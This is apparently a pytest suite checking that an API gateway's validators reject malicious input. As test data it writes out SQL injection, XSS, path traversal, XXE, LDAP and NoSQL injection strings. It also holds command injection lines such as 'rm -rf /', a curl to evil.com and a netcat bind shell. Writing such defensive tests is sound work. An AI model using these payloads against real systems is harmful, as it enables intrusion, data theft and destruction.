"""
Input Validation Security Tests

Tests input validation security, SQL injection protection,
XSS prevention, and data sanitization.

Author: Lucid Development Team
Version: 1.0.0
"""

import pytest
import json
import re
from unittest.mock import patch, MagicMock
from fastapi import HTTPException
from fastapi.testclient import TestClient
from pydantic import ValidationError
import sys
sys.path.insert(0, '03-api-gateway')
from utils.validation import InputValidator
sys.path.insert(0, '03-api-gateway')
from models.user import UserCreate, UserUpdate
from models.session import SessionCreate, SessionUpdate
from models.auth import LoginRequest
from auth.utils.validators import SecurityValidator


class TestInputValidationSecurity:
    """Test input validation security mechanisms."""

    def setup_method(self):
        """Setup test fixtures."""
        self.input_validator = InputValidator()
        self.security_validator = SecurityValidator()
        self.client = TestClient(None)  # Will be set up in individual tests

    def test_sql_injection_protection(self):
        """Test protection against SQL injection attacks."""
        # Test common SQL injection patterns
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for payload in sql_injection_payloads:
            # Test username field
            with pytest.raises(ValidationError):
                UserCreate(
                    username=payload,
                    email="test@example.com",
                    password="password123"
                )
            
            # Test email field
            with pytest.raises(ValidationError):
                UserCreate(
                    username="testuser",
                    email=payload,
                    password="password123"
                )

    def test_xss_protection(self):
        """Test protection against XSS attacks."""
        # Test common XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>"
        ]
        
        for payload in xss_payloads:
            # Test username field
            with pytest.raises(ValidationError):
                UserCreate(
                    username=payload,
                    email="test@example.com",
                    password="password123"
                )
            
            # Test session name field
            with pytest.raises(ValidationError):
                SessionCreate(
                    name=payload,
                    description="test session"
                )

    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        # Test common path traversal payloads
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test file upload field
            with pytest.raises(ValidationError):
                self.input_validator.validate_file_path(payload)
            
            # Test session file field
            with pytest.raises(ValidationError):
                SessionCreate(
                    name="test",
                    file_path=payload
                )

    def test_command_injection_protection(self):
        """Test protection against command injection attacks."""
        # Test common command injection payloads
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "|| id",
            "; ls -la",
            "`whoami`",
            "$(id)",
            "; curl http://evil.com/steal",
            "| nc -l -p 4444 -e /bin/bash"
        ]
        
        for payload in command_injection_payloads:
            # Test system command field
            with pytest.raises(ValidationError):
                self.input_validator.validate_system_command(payload)
            
            # Test node command field
            with pytest.raises(ValidationError):
                self.input_validator.validate_node_command(payload)

    def test_ldap_injection_protection(self):
        """Test protection against LDAP injection attacks."""
        # Test common LDAP injection payloads
        ldap_injection_payloads = [
            "*",
            "*)(uid=*",
            "*)(|(uid=*",
            "*)(|(objectClass=*",
            "*)(|(cn=*",
            "*)(|(mail=*",
            "*)(|(sn=*",
            "*)(|(givenName=*"
        ]
        
        for payload in ldap_injection_payloads:
            # Test LDAP search field
            with pytest.raises(ValidationError):
                self.input_validator.validate_ldap_search(payload)

    def test_no_sql_injection_protection(self):
        """Test protection against NoSQL injection attacks."""
        # Test common NoSQL injection payloads
        nosql_injection_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.password == this.username"}',
            '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
            '{"$where": "function() { return this.username == this.password }"}',
            '{"$ne": ""}',
            '{"$exists": true}'
        ]
        
        for payload in nosql_injection_payloads:
            # Test MongoDB query field
            with pytest.raises(ValidationError):
                self.input_validator.validate_mongodb_query(payload)

    def test_email_validation_security(self):
        """Test email validation security."""
        # Test malicious email patterns
        malicious_emails = [
            "test@evil.com<script>alert('xss')</script>",
            "test@evil.com'; DROP TABLE users; --",
            "test@evil.com|cat /etc/passwd",
            "test@evil.com`whoami`",
            "test@evil.com$(id)",
            "test@evil.com; rm -rf /",
            "test@evil.com&&whoami",
            "test@evil.com||id"
        ]
        
        for email in malicious_emails:
            with pytest.raises(ValidationError):
                UserCreate(
                    username="testuser",
                    email=email,
                    password="password123"
                )

    def test_password_validation_security(self):
        """Test password validation security."""
        # Test weak passwords
        weak_passwords = [
            "123456",
            "password",
            "admin",
            "qwerty",
            "abc123",
            "12345678",
            "password123",
            "admin123",
            "qwerty123",
            "abc123456"
        ]
        
        for password in weak_passwords:
            with pytest.raises(ValidationError):
                UserCreate(
                    username="testuser",
                    email="test@example.com",
                    password=password
                )

    def test_json_injection_protection(self):
        """Test protection against JSON injection attacks."""
        # Test malicious JSON payloads
        json_injection_payloads = [
            '{"username": "admin", "role": "admin"}',
            '{"username": "test", "isAdmin": true}',
            '{"username": "test", "permissions": ["admin"]}',
            '{"username": "test", "role": "super_admin"}',
            '{"username": "test", "accessLevel": 999}',
            '{"username": "test", "bypassAuth": true}'
        ]
        
        for payload in json_injection_payloads:
            with pytest.raises(ValidationError):
                self.input_validator.validate_json_payload(payload)

    def test_xml_injection_protection(self):
        """Test protection against XML injection attacks."""
        # Test malicious XML payloads
        xml_injection_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>'
        ]
        
        for payload in xml_injection_payloads:
            with pytest.raises(ValidationError):
                self.input_validator.validate_xml_payload(payload)

    def test_csrf_protection(self):
        """Test CSRF protection."""
        # Test CSRF token validation
        with pytest.raises(HTTPException) as exc_info:
            self.security_validator.validate_csrf_token("invalid-token")
        assert exc_info.value.status_code == 403

    def test_file_upload_validation(self):
        """Test file upload validation security."""
        # Test malicious file uploads
        malicious_files = [
            "malware.exe",
            "virus.bat",
            "trojan.sh",
            "backdoor.php",
            "shell.jsp",
            "exploit.py",
            "hack.rb",
            "attack.pl"
        ]
        
        for filename in malicious_files:
            with pytest.raises(ValidationError):
                self.input_validator.validate_file_upload(filename, "application/octet-stream")

    def test_content_type_validation(self):
        """Test content type validation security."""
        # Test malicious content types
        malicious_content_types = [
            "application/x-executable",
            "application/x-msdownload",
            "application/x-msdos-program",
            "application/x-msi",
            "application/x-php",
            "application/x-javascript",
            "text/html",
            "text/xml"
        ]
        
        for content_type in malicious_content_types:
            with pytest.raises(ValidationError):
                self.input_validator.validate_content_type(content_type)

    def test_file_size_validation(self):
        """Test file size validation security."""
        # Test oversized files
        oversized_files = [
            (1024 * 1024 * 1024, "1GB file"),  # 1GB
            (1024 * 1024 * 100, "100MB file"),  # 100MB
            (1024 * 1024 * 50, "50MB file"),   # 50MB
        ]
        
        for size, description in oversized_files:
            with pytest.raises(ValidationError):
                self.input_validator.validate_file_size(size)

    def test_input_length_validation(self):
        """Test input length validation security."""
        # Test oversized inputs
        oversized_inputs = [
            "A" * 10000,  # 10KB string
            "B" * 100000, # 100KB string
            "C" * 1000000, # 1MB string
        ]
        
        for input_data in oversized_inputs:
            with pytest.raises(ValidationError):
                UserCreate(
                    username=input_data,
                    email="test@example.com",
                    password="password123"
                )

    def test_special_character_validation(self):
        """Test special character validation security."""
        # Test dangerous special characters
        dangerous_chars = [
            "\x00",  # Null byte
            "\x01",  # SOH
            "\x02",  # STX
            "\x03",  # ETX
            "\x04",  # EOT
            "\x05",  # ENQ
            "\x06",  # ACK
            "\x07",  # BEL
            "\x08",  # BS
            "\x0B",  # VT
            "\x0C",  # FF
            "\x0E",  # SO
            "\x0F",  # SI
        ]
        
        for char in dangerous_chars:
            with pytest.raises(ValidationError):
                UserCreate(
                    username=f"test{char}user",
                    email="test@example.com",
                    password="password123"
                )

    def test_unicode_validation(self):
        """Test Unicode validation security."""
        # Test malicious Unicode sequences
        malicious_unicode = [
            "\u0000",  # Null character
            "\u202E",  # Right-to-left override
            "\u202D",  # Left-to-right override
            "\uFEFF",  # Zero width no-break space
            "\u200B",  # Zero width space
            "\u200C",  # Zero width non-joiner
            "\u200D",  # Zero width joiner
        ]
        
        for unicode_char in malicious_unicode:
            with pytest.raises(ValidationError):
                UserCreate(
                    username=f"test{unicode_char}user",
                    email="test@example.com",
                    password="password123"
                )

    def test_regex_validation_security(self):
        """Test regex validation security."""
        # Test malicious regex patterns
        malicious_regex = [
            r"^(a+)+$",  # ReDoS pattern
            r"^(a*)*$",  # ReDoS pattern
            r"^(a|a)*$", # ReDoS pattern
            r"^(a|a+)*$", # ReDoS pattern
            r"^(a+)*$",  # ReDoS pattern
        ]
        
        for regex_pattern in malicious_regex:
            with pytest.raises(ValidationError):
                self.input_validator.validate_regex_pattern(regex_pattern)

    def test_input_sanitization(self):
        """Test input sanitization security."""
        # Test that inputs are properly sanitized
        malicious_input = "<script>alert('xss')</script>"
        sanitized = self.input_validator.sanitize_input(malicious_input)
        
        assert "<script>" not in sanitized
        assert "alert" not in sanitized
        assert "xss" not in sanitized

    def test_input_encoding_validation(self):
        """Test input encoding validation security."""
        # Test malicious encoding attempts
        malicious_encodings = [
            "test%00user",  # Null byte encoding
            "test%01user",  # Control character encoding
            "test%02user",  # Control character encoding
            "test%03user",  # Control character encoding
        ]
        
        for encoded_input in malicious_encodings:
            with pytest.raises(ValidationError):
                self.input_validator.validate_encoded_input(encoded_input)

    def test_input_validation_audit_logging(self):
        """Test input validation audit logging."""
        with patch('03-api-gateway.middleware.logging.AuditLogger') as mock_logger:
            # Test malicious input
            with pytest.raises(ValidationError):
                UserCreate(
                    username="<script>alert('xss')</script>",
                    email="test@example.com",
                    password="password123"
                )
            
            # Verify audit logging
            mock_logger.log_validation_failure.assert_called()

    def test_input_validation_rate_limiting(self):
        """Test input validation rate limiting."""
        # Test that excessive validation failures are rate limited
        for i in range(100):  # Simulate many validation failures
            with pytest.raises(ValidationError):
                UserCreate(
                    username="<script>alert('xss')</script>",
                    email="test@example.com",
                    password="password123"
                )
        
        # Should trigger rate limiting
        with pytest.raises(HTTPException) as exc_info:
            self.input_validator.validate_input("test")
        assert exc_info.value.status_code == 429
